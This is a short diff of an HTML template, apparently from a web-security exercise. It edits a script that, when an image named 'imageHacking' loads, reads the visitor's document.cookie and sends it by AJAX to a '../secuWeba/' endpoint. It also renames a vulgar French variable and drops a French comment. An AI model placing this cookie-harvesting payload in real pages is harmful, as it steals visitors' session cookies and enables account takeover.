@@ -67,18 +67,14 @@
       var imgHacking = document.getElementById("imageHacking")
       imgHacking.addEventListener("load", function ()
       {
-      var tamere = document.cookie;
-      console.log(tamere);
+      var cookies = document.cookie;
       $.ajax({
-          url: '../secuWeba',
-          data: {'tamere': tamere},
+          url: '../secuWeba/',
+          data: {'cookies': cookies},
            success: function (response) {
-              console.log(response);
+              console.log(response['cookie']);
            }
       })
-      {#ajax qui envoie les données à un serveur #}
-
-
       })
   </script>
 </html>
